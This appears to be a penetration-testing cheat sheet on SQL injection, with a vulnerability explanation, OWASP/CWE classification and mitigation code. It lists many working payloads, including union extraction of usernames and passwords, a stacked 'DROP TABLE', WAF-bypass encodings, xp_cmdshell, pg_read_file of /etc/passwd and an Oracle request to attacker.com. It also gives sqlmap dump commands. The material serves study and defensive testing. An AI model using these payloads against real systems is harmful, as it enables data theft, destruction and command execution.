Critical Severity

📌 SQL Injection

🧠 Description

What is SQL Injection?

SQL Injection is a code injection technique that allows attackers to interfere with the queries an application makes to its database. It occurs when user input is improperly sanitized before being included in SQL queries.

Why does it occur?

Applications construct SQL queries by concatenating user input directly into the query string without proper sanitization or parameterization.

Security principle violated: Input Validation

Real-world analogy: Like someone filling out a form and instead of writing their name, they write "DROP TABLE users" - and the system blindly executes it.

🏷️ Classification

  • Type: Injection
  • OWASP: A03:2021 – Injection
  • CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command

🎯 Attack Surface (Where to Test)

  • ✅ URL parameters (?id=, ?user=)
  • ✅ POST body (JSON, form-data, XML)
  • ✅ Headers (User-Agent, Referer, X-Forwarded-For)
  • ✅ Cookies / Sessions
  • ✅ File uploads (filename injection)
  • ✅ API endpoints (REST / GraphQL)

🔍 Detection Methodology

1. Static Analysis (Source Code)

// Vulnerable code pattern
String query = "SELECT * FROM users WHERE id = " + request.getParameter("id");
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

2. Dynamic Analysis (Burp Suite / Manual)

  • Intercept request and inject single quote (')
  • Observe error messages for database information
  • Use time-based payloads to detect blind injection

Tools: Burp Suite, SQLmap, OWASP ZAP

💣 Basic Payloads

' OR '1'='1
' OR 1=1--
" OR "1"="1
' OR '1'='1'#
' OR 1=1#
' OR 1=1/*

🚀 Advanced Payloads / Bypass

# Union-based payloads
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT @@version,2,3--
' UNION SELECT username,password FROM users--

# Time-based (MySQL)
' OR SLEEP(5)--
' OR BENCHMARK(1000000,MD5('a'))--

# Boolean-based
' AND 1=1--
' AND 1=2--

# Stacked queries
'; DROP TABLE users; --

# WAF Bypass - Case Obfuscation
' Or 1=1--
' oR 1=1--

# WAF Bypass - URL Encoding
%27%20OR%201%3D1--

# WAF Bypass - Comment Obfuscation
'/**/OR/**/1=1--
' OR 1=1-- -

# WAF Bypass - Double Encoding
%2527%2520OR%25201%253D1--

# MSSQL Specific
' WAITFOR DELAY '0:0:5'--
' EXEC xp_cmdshell('dir')--

# PostgreSQL Specific
' || pg_sleep(5)--
' SELECT pg_read_file('/etc/passwd')--

# Oracle Specific
' || utl_http.request('http://attacker.com')--

✔ Must be reproducible

⚙️ Exploitation Steps

  1. Identify vulnerable parameter (test with ', ", '))
  2. Determine database type (MySQL, PostgreSQL, MSSQL, Oracle)
  3. Use UNION attacks to extract data
  4. Extract table names, column names, and data
  5. Escalate to OS command execution (if applicable)

🛡️ Mitigation

✅ Parameterized Queries (Prepared Statements): Always use prepared statements with bound parameters.
✅ Input Validation: Whitelist allowed characters and validate data types.
✅ Stored Procedures: Use stored procedures with limited privileges.
✅ Escaping User Input: Properly escape special characters.
✅ Least Privilege: Database accounts should have minimal required permissions. 
// Secure implementation (Java - PreparedStatement)
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setInt(1, Integer.parseInt(userId));
ResultSet rs = stmt.executeQuery();

// Python - Parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

// PHP - PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $userId]);

🔓 Mitigation Bypass

  • Weak WAF Rules: Use case obfuscation (Or 1=1), comments (/**/), or URL encoding
  • Incomplete Blacklisting: Use alternative SQL syntax or stacked queries
  • Encoding Tricks: Double URL encoding, Unicode encoding

⚠️ Risk / Impact

Severity: Critical

Impact:
  • Data breach: Read sensitive data (usernames, passwords, PII, financial data)
  • Authentication bypass: Log in as any user without password
  • Data manipulation: Insert, update, delete records
  • Remote Code Execution: Execute OS commands (depending on DB permissions)
  • Denial of Service: Delete tables or overload database

📎 Proof of Concept (PoC)

# SQLmap automated exploitation
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D database_name --tables
sqlmap -u "https://target.com/page?id=1" -D database_name -T users --dump

# Manual exploitation
https://target.com/page?id=1' UNION SELECT username,password FROM users--

# Time-based blind (MySQL)
https://target.com/page?id=1' AND SLEEP(5)--
